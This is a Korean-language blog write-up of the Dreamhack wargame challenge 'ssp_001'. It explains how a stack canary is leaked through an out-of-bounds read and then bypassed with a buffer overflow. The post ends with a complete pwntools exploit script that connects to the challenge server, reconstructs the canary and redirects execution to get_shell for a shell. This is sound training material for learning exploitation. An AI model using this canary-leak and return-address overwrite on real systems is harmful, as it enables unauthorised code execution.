---
layout: post
title: 'System Hacking Step 6: ssp_001'
summary: Stack Canary and How to Bypass It; wargame
author: TouBVa
date: '2023-02-03 22:44:23 +09'
category: dreamhack_system_hacking
thumbnail: /assets/img/posts/ssp_001/Untitled%207.jpeg
keywords: System Hacking, Stack Canary
usemathjax: true
permalink: /blog/dreamhack_system_hacking/step6/ssp_001
---


* TOC
{:toc}

<br>

# 1. 코드 분석

이 문제는 코드와 바이너리를 함께 제시해 주는 문제다. 그러나 더 깊은 공부를 위해 코드가 주어지지 않았다는 가정 하에서 문제를 풀기 위해 바이너리를 분석해 보았다. 설명하기에 앞서, 바이너리만 주어진 상황에서의 분석 순서는 동적 분석 → 정적 분석이라는 점을 강조하고 싶다. 해당 바이너리가 어떤 행위를 하는지 추상적으로 알고 있어야 정적 분석을 할 때 중요한 포인트를 찾아가는 지표를 가질 수 있기 때문이다. 따라서, 아래에 이어지는 바이너리 정적 분석은 동적 분석이 이미 이루어졌다는 것을 전제로 한다.

<br>

## 1.1. 사용된 함수 목록 확인

먼저 `ssp_001` 바이너리에 gdb를 물려 해당 바이너리 내부에서 사용되었던 functions들의 목록을 찾아 보았다. 바이너리가 ripped 되지 않았고, 난독화되지 않은 상태라면 쉽게 functions들의 목록을 불러올 수 있을 것이다.

![Untitled](/assets/img/posts/ssp_001/Untitled.jpeg)

당장 확인되는 functions들 중 눈에 띄는 건 `system@plt` 와 `get_shell` 이다. 전자가 존재한다는 것은 타겟 시스템에 ASLR이 걸려 있더라도 got, plt overwrite 방식으로 우회하여 쉘을 딸 수 있다는 의미이고, 후자는 누가 봐도 함수의 코드 플로우를 조작해 접근해야 하는 목표물처럼 보이기 때문이다.

<br>

## 1.2. main 함수의 어셈블리 확인

이제 `main` 함수의 어셈블리를 확인해 보자.

카나리를 다루는 모습이다. 32비트 프로그램이므로 `ebp-0x8` 에 `gs:0x14` 가 들어간다. 관련한 내용은 [여기](https://toubva.github.io/blog/dreamhack_system_hacking/step6-1#/)에서 복습하자!

![Untitled](/assets/img/posts/ssp_001/Untitled%201.jpeg)

<br>

### 1.2.1. 함수 branch 별 행동 확인

해당 바이너리의 실행 모습(선택지가 나오고, 사용자가 선택한 선택지에 따라 다른 내용의 프로그램 branch가 전개되는 형식)을 감안했을 때, 아마 main 함수 혹은 선택지를 제시하기 위해 call 되는 함수 내부에는 최소 3개 이상의 cmp-jmp 구문이 존재할 것이다. 해당 구간을 찾아 보았다.

![Untitled](/assets/img/posts/ssp_001/Untitled%202.jpeg)

추측이 맞았다. 3개의 cmp-jmp 쌍이 존재했고, 각각의 쌍은 main 함수의 특정 부분으로 점프하는 모습을 보여준다. main 함수 내부에서 모든 작업이 이루어지는 것으로 생각되며, 해당 구문은 if - if - if - else 형식의 문법을 취하고 있는 것으로 보인다. 또한 cmp하는 대상이 각각 아스키 코드로 ‘F’, ‘P’, ‘E’인 것으로 봤을 때, 프로그램을 실행했을 때 바로 나오는 아래의 선택지 부분임을 알 수 있다.

![Untitled](/assets/img/posts/ssp_001/Untitled%203.jpeg)

이제 각 선택지에 따른 동작을 확인해 보자.

<br>

### 1.2.2. 선택지 [F]의 경우

선택지 P의 경우인 어셈블리 라인은 `main+192` 부터 시작하므로 `main+155~main+187` 까지의 라인이 선택지 F에 해당된다.

![Untitled](/assets/img/posts/ssp_001/Untitled%204.jpeg)

해당 라인의 핵심은 `read` 함수와 연관이 깊어 보인다. `read(0, eax([ebp-0x88]), 0x40)` 을 호출하는 정황으로 미루어 보았을 때, 사용자의 input 0x40개를 `ebp-0x88` 에 저장하는 것으로 보인다. 아마 실제 소스에서는 `read(0, buf, 0x40)`쯤 될 것이다.

<br>

### 1.2.3. 선택지 [P]의 경우

![Untitled](/assets/img/posts/ssp_001/Untitled%205.jpeg)

선택지 P를 처리하는 어셈블리 라인에서는 주목할 만한 행위 두 가지가 보인다. 바로 `scanf("{some words}{format_string}", *(ebp-0x94))` 와 `print_box` 를 콜하는 것이다. 먼저 `ebp-0x94` 에 저장되는 것은 어셈블리어만을 보고 알 수는 없다. 32비트 환경에서의 주소값과 int 값은 동일한 4byte로 어셈블리어 상에서 구분이 안 되기 때문이다. 따라서 동적으로 분석해야만 한다. 그 결과, `ebp-0x94` 에는 int가 저장되는 것을 확인할 수 있었다.

<br>

그렇다면 이제 `print_box(ebp-0x88, ebp-0x94)` 가 어떤 일을 하는지 알아보자.  

![Untitled](/assets/img/posts/ssp_001/Untitled%206.jpeg)

`ebp-0xc` 는 인자로 줬던 `ebp-0x94` 가 저장된 곳이고, `ebp-0x8`은 인자로 줬던 `ebp-0x88`이 저장된 곳이다. 

`ebp-x088`을 a, `ebp-0x94`를 b라고 하면 a+b를 한 단위가 1바이트인 주소로 참조해 해당 주소에 저장된 하위 1바이트를 eax에 저장하여 printf에게 주는 인자로 사용한다. 이건 거꾸로 KTX를 타고 가면서 봐도 사용자에게 입력받았던 값을 index로 하여 char 배열을 참조한 다음, 해당 위치에 저장된 값을 출력해 주는 것처럼 보인다.

이 지점에서 OOB(Out-Of-Bound)가 가능한 것으로 추측된다.

<br>

### 1.2.4. 선택지 [E]의 경우

![Untitled](/assets/img/posts/ssp_001/Untitled%207.jpeg)

`scanf`와 `read`함수를 사용하는 것이 눈에 띈다. 아까부터 각 branch별로 특정 함수들을 강조하는데, 그 이유는 이들이 사용자와 interaction하는, 취약성을 내재할 확률이 가장 큰 부분이기 때문이다.

`scanf(”{string}{format_string}”, *(ebp-0x90))` , `read(0, *(ebp-0x48), *(ebp-0x90)` 을 보면 사용자로부터 입력받아 저장되는 `ebp-0x90` 이 int라는 것을 알 수 있다. 

즉, 사용자에게 특정 숫자를 받고, 그 숫자만큼의 글자를 입력받는 행위를 하고 있다. 이는 매우 취약한 코드인데, 검증되지 않은 입력을 검증하기 위한 boundary check 마저 검증되지 않은 소스에게 의존하고 있기 때문이다.

해당 행위를 수행한 다음, 사진에는 잘려 있지만 스택 카나리를 확인하여 main 함수를 끝내는 플로우로 이어진다.

<br>

<br>

# 2. 취약점 지정 및 익스플로잇 방법 선정

<br>

## 2.1. 분석 요약 및 필요한 정보 선정

<br>

앞에서 분석한 내용을 요약하면 아래와 같다.

- F 옵션: 사용자의 입력을 buf에 저장한다.
- P 옵션: 사용자의 int type 입력 x 를 받아 buf[x]를 참조해 출력한다. 여기에서 OOB로 인한 Memory Leak이 가능하다. (아래 사진 참고-buf는 0x40 길이이므로 인덱스의 한계는 63이지만 70번 인덱스에 접근 가능하다)
    
    ![Untitled](/assets/img/posts/ssp_001/Untitled%208.jpeg)
    
- E 옵션: 사용자로부터 입력값의 길이 y를 받고, read 함수로 y 만큼의 입력을 받아 buf2에 저장한다. 해당 작업이 끝나면 프로그램을 종료한다. 여기에서 잘못된 boundary check로 인한 BOF 취약점이 발생한다.

<br>

해당 프로그램을 익스플로잇하기 위해서 필요한 정보는 아래와 같다.

1. 해당 프로그램에 걸려 있는 보호 기법의 목록
    
    ![Untitled](/assets/img/posts/ssp_001/Untitled%209.jpeg)
    
    - ASLR은 꺼져 있을 것이다.(현재 커리큘럼상)
    - NX enabled 이므로 스택에는 실행 권한이 없다. 즉, RTL이나 PLT&GOT overwrite 등으로 우회해야만 한다.
    - RELRO가 Partial로 걸려 있다. 이 경우 GOT에는 RO가 걸리지 않으므로 GOT 변조로 우회 가능하다.
    - 스택 카나리가 걸려 있다. FSB 혹은 OOB 등으로 Canary Leak을 하는 것이 현실적인 우회 기법이다.
2. 스택 카나리의 값
    - P 옵션 실행 시 OOB로 인한 Canary Leak이 가능해 보인다.
    - **그렇다면 사용자 입력값으로 얼마를 줘야 할까?**
3. 스택 프레임을 오염시키고 무한 루프를 종료할 수 있는 코드 플로우
    - E 옵션 실행 시 두 가지가 BOF로 인해 모두 가능하다.
    - **ASLR이 꺼져 있고, NX enabled인 상황에서 가장 쉽게 가능한 방식인 RTL을 수행하기 위해 작성해야 하는 페이로드 구성은 무엇이 될까?**

<br>

## 2.2. 필요한 정보 알아내기

<br>

### 2.2.1. [P] 옵션상에서, 사용자 입력값으로 무엇을 줘야 Canary Leak이 가능할까?

<br>

P 옵션을 줬을 때 읽어오는 항목인 box 배열의 시작 지점이 스택의 어디에 할당되었는지 확인해 보자.

![Untitled](/assets/img/posts/ssp_001/Untitled%2010.jpeg)

ebp-0x88 지점이다.

그렇다면 스택 카나리는 어디에 저장되는지 확인해 보자.

![Untitled](/assets/img/posts/ssp_001/Untitled%2011.jpeg)

ebp-0x8 지점이다.

즉, box[0x80] 지점이 스택 카나리의 시작점일 것으로 추정된다. 정말인지 확인해 보자.

![Untitled](/assets/img/posts/ssp_001/Untitled%2012.jpeg)

메모리를 낮은 주소에서부터 읽어오는 점, 그리고 현재 프로세서가 리틀 엔디안이라는 점을 감안하면 아마 스택 카나리의 값은 0x1e831700일 것이다.

![Untitled](/assets/img/posts/ssp_001/Untitled%2013.jpeg)

실제로 확인해 보니 일치하는 것을 알 수 있었다.

<br>

### 2.2.2. [E] 옵션 실행 시 삽입될 페이로드 구성은 어떻게 해야 할까?

<br>

E 옵션을 줬을 때, 사용자가 입력할 길이를 지정하게 한 다음 입력을 받는다. 그렇다면 사용자의 입력을 받아 저장하는 버퍼의 위치는 어디일까?

![Untitled](/assets/img/posts/ssp_001/Untitled%2014.jpeg)

 read 함수의 두번째 인자로 저장될 버퍼의 주소가 들어가므로 현재 `main+302` 에서 `eax` 에 들어간 `ebp-0x48` 이 인자가 저장될 주소이다.

즉, 

**0x40 dump byte + 0x04 Stack Canary + 0x04 dump + 0x04 ebp + return address + 0x04 dump + parameters**

가 삽입할 페이로드의 구성이 된다.

<br>

### 2.2.3. 리턴 어드레스는 어디로 조작해야 할까?

<br>

1.1.에서 확인한 함수들의 이름 중 수상한 것이 두 개 있었다. 바로 `system` 과 `get_shell` 이었다. 전자를 사용할 수도 있지만 후자를 한 번 확인해 보고, 둘 중 무엇으로 코드 플로우를 변경하는 것이 효율적일지 고민해 보자.

![Untitled](/assets/img/posts/ssp_001/Untitled%2015.jpeg)

![Untitled](/assets/img/posts/ssp_001/Untitled%2016.jpeg)

진짜로 KTX 타고 백덤블링하면서 봐도 system(”/bin/sh”)를 실행해 주는 함수다.

현재 ASLR이 꺼져 있어, 사용된 라이브러리의 베이스 주소를 찾고 → system 함수의 오프셋을 찾고 → /bin/sh 문자열의 주소를 찾은 다음 RTL을 하는 것보다 그냥 `get_shell` 함수로 리다이렉션을 하는 게 훨씬 나아 보인다. 따라서 리턴 어드레스로는 `get_shell` 의 주소를 줄 것이다.

만일 ASLR이 켜져 있다면, OOB 취약점을 이용해 main의 리턴 어드레스까지를 읽어서(동일 버전으로 컴파일되었다면 main의 리턴 어드레스는 동일한 라이브러리 함수로 이어지기 때문에 libc base를 알아낼 수 있다) libc base를 알아내 RTL을 수행하는 게 더 쉬울지도 모른다.

<br>

## 2.3. 취약점 익스플로잇 시나리오 세우기

<br>

따라서 가능한 취약점 익스플로잇 시나리오는 크게 두 단계로 나뉘며, 아래와 같다.

1. 스택 카나리를 알아내는 과정
    - P, 131, P, 130, P, 129, P, 128을 입력하고 값을 받기를 반복한다.
    - 받아온 값을 bytearray의 concatenate를 이용하여 조합해 p32() 함수로 패킹한다.
2. 알아낸 카나리를 포함한 페이로드를 만들어 RTL이나 ROP를 성공시키는 과정
    - 페이로드의 구성:
        - **0x40 dump byte + 0x04 Stack Canary + 0x04 dump + 0x04 ebp + get_shell addr + 0x04 dump + parameters**

<br>

<br>

# 3. 익스플로잇 작성 후 실행

<br>

```python
from pwn import *

e=ELF("./ssp_001")

p = remote('host3.dreamhack.games', 24236)

get_shell=e.symbols['get_shell'] #get_shell 주소는 pwntools가 알아서 찾아줄 것이다

# figuring out the stack canary
canary = bytearray()
temp=bytearray(2)
for i in range (0, 4):
    p.sendlineafter("> ", "P")
    p.sendline(str(131-i))
    p.recvuntil("is : ")
    temp=p.recv(2)
    canary= canary + temp

# converting canary from str to int -> 32bit packed byte 
canary = int(canary, 16)
canary = p32(canary)

print(hexdump(canary))

# giving F option to do BOF exploitation and set the payload length
p.sendlineafter("> ", "E")

p.sendlineafter("Name Size : ", "300")

# now constructing payload; 1) BOF 2) Canary 3) getting shell(NX bit enabled)
dump = b'A'*0x40
canary
dump2=b'A'*4
ebp_dump=b'A'*4
get_shell=p32(get_shell)

payload = dump+canary+dump2+ebp_dump+get_shell

# gdb.attach(p)
# raw_input("1")

p.sendlineafter("Name : ", payload)

p.interactive()
```

그 결과, 플래그를 얻을 수 있었다. 플래그 인증샷은 스포가 되니 넣지 않을 것이다…
